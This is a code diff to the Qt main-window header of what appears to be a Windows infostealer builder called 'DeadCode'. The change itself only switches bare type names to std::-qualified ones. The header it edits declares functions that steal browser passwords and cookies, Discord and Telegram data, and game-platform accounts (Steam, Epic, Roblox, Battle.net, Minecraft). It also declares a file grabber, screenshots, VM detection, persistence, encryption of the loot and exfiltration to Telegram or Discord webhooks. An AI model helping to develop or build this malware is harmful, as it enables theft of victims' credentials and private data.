@@ -42,17 +42,6 @@
 #include <tlhelp32.h>
 #include <psapi.h>
 
-// Добавляем пространство имен std для стандартных типов
-namespace std {
-    using string = ::std::string;
-    using vector = ::std::vector;
-    using array = ::std::array;
-    using mutex = ::std::mutex;
-}
-
-// Указываем, что используем пространство имен std
-using namespace std;
-
 QT_BEGIN_NAMESPACE
 namespace Ui { class MainWindow; }
 QT_END_NAMESPACE
@@ -68,8 +57,8 @@ public:
     MainWindow(QWidget *parent = nullptr);  // Конструктор главного окна
     ~MainWindow();                         // Деструктор для очистки ресурсов
 
-    string generateUniqueXorKey();         // Генерация уникального XOR-ключа
-    array<unsigned char, 16> GetEncryptionKey(bool useFirstKey); // Получение ключа шифрования
+    std::string generateUniqueXorKey();         // Генерация уникального XOR-ключа
+    std::array<unsigned char, 16> GetEncryptionKey(bool useFirstKey); // Получение ключа шифрования
     bool isRunningInVM();                  // Проверка на виртуальную машину
 
     // Структура для хранения настроек
@@ -94,18 +83,18 @@ public:
         bool silent = false;               // Включение тихого режима
         bool autoStart = false;            // Включение автозапуска
         bool persist = false;              // Включение персистентности
-        string sendMethod = "Local File";  // Метод отправки данных (Telegram, Discord, Local File)
-        string buildMethod = "Local Build"; // Метод сборки (Local Build, GitHub Actions)
-        string telegramToken = "";         // Токен для Telegram
-        string chatId = "";                // Chat ID для Telegram
-        string discordWebhook = "";        // Вебхук для Discord
-        string filename = "DeadCode.exe";  // Имя выходного файла
-        string encryptionKey1 = "";        // Первый ключ шифрования
-        string encryptionKey2 = "";        // Второй ключ шифрования
-        string encryptionSalt = "";        // Соль для шифрования
-        string iconPath = "";              // Путь к файлу иконки
-        string githubToken = "";           // Токен GitHub
-        string githubRepo = "";            // Репозиторий GitHub
+        std::string sendMethod = "Local File";  // Метод отправки данных (Telegram, Discord, Local File)
+        std::string buildMethod = "Local Build"; // Метод сборки (Local Build, GitHub Actions)
+        std::string telegramToken = "";         // Токен для Telegram
+        std::string chatId = "";                // Chat ID для Telegram
+        std::string discordWebhook = "";        // Вебхук для Discord
+        std::string filename = "DeadCode.exe";  // Имя выходного файла
+        std::string encryptionKey1 = "";        // Первый ключ шифрования
+        std::string encryptionKey2 = "";        // Второй ключ шифрования
+        std::string encryptionSalt = "";        // Соль для шифрования
+        std::string iconPath = "";              // Путь к файлу иконки
+        std::string githubToken = "";           // Токен GitHub
+        std::string githubRepo = "";            // Репозиторий GitHub
     } config;
 
     // UI элементы
@@ -167,25 +156,25 @@ private slots:
 
     // Слоты для процесса кражи и отправки данных
     void startStealProcess();               // Запуск процесса кражи данных после успешной сборки
-    void StealAndSendData(const string& tempDir); // Основная функция кражи и отправки данных
-    void takeScreenshot(const string& dir); // Создание скриншота
-    void collectSystemInfo(const string& dir); // Сбор системной информации
-    void stealBrowserData(const string& dir); // Кража данных браузера (пароли, куки)
-    void stealDiscordData(const string& dir); // Кража данных Discord (токены, история чатов)
-    void stealTelegramData(const string& dir); // Кража данных Telegram (история чатов)
-    void stealSteamData(const string& dir);   // Кража данных Steam (конфиги, MA-файлы)
-    void stealEpicData(const string& dir);    // Кража данных Epic Games
-    void stealRobloxData(const string& dir);  // Кража данных Roblox
-    void stealBattleNetData(const string& dir); // Кража данных Battle.net
-    void stealMinecraftData(const string& dir); // Кража данных Minecraft
-    void stealFiles(const string& dir);       // Кража файлов (граббер)
-    void collectSocialEngineeringData(const string& dir); // Сбор данных для социальной инженерии
-    void archiveData(const string& dir, const string& archivePath); // Архивация данных
-    void encryptData(const string& inputPath, const string& outputPath); // Шифрование данных
-    void decryptData(const string& inputPath, const string& outputPath); // Дешифрование данных
-    void sendData(const string& filePath);    // Отправка данных
-    void sendToTelegram(const string& filePath); // Отправка данных в Telegram
-    void sendToDiscord(const string& filePath);  // Отправка данных в Discord
+    void StealAndSendData(const std::string& tempDir); // Основная функция кражи и отправки данных
+    void takeScreenshot(const std::string& dir); // Создание скриншота
+    void collectSystemInfo(const std::string& dir); // Сбор системной информации
+    void stealBrowserData(const std::string& dir); // Кража данных браузера (пароли, куки)
+    void stealDiscordData(const std::string& dir); // Кража данных Discord (токены, история чатов)
+    void stealTelegramData(const std::string& dir); // Кража данных Telegram (история чатов)
+    void stealSteamData(const std::string& dir);   // Кража данных Steam (конфиги, MA-файлы)
+    void stealEpicData(const std::string& dir);    // Кража данных Epic Games
+    void stealRobloxData(const std::string& dir);  // Кража данных Roblox
+    void stealBattleNetData(const std::string& dir); // Кража данных Battle.net
+    void stealMinecraftData(const std::string& dir); // Кража данных Minecraft
+    void stealFiles(const std::string& dir);       // Кража файлов (граббер)
+    void collectSocialEngineeringData(const std::string& dir); // Сбор данных для социальной инженерии
+    void archiveData(const std::string& dir, const std::string& archivePath); // Архивация данных
+    void encryptData(const std::string& inputPath, const std::string& outputPath); // Шифрование данных
+    void decryptData(const std::string& inputPath, const std::string& outputPath); // Дешифрование данных
+    void sendData(const std::string& filePath);    // Отправка данных
+    void sendToTelegram(const std::string& filePath); // Отправка данных в Telegram
+    void sendToDiscord(const std::string& filePath);  // Отправка данных в Discord
 
     // Слоты для управления конфигурацией и логами
     void saveConfig(const QString& fileName = QString()); // Сохранение конфигурации
@@ -214,9 +203,9 @@ private slots:
 private:
     // Приватные методы
     void animateSection(QLabel* sectionLabel, QSpacerItem* spacer); // Анимация появления секций
-    QByteArray applyXOR(const QByteArray& data, const array<unsigned char, 16>& key); // Применение XOR-шифрования
-    QByteArray applyAES(const QByteArray& data, const array<unsigned char, 16>& key, const array<unsigned char, 16>& iv); // Применение AES-шифрования
-    array<unsigned char, 16> generateIV(); // Генерация инициализационного вектора для AES
+    QByteArray applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key); // Применение XOR-шифрования
+    QByteArray applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv); // Применение AES-шифрования
+    std::array<unsigned char, 16> generateIV(); // Генерация инициализационного вектора для AES
     void emitLog(const QString& message);  // Удобный метод для вызова сигнала logUpdated
 
     // Приватные члены
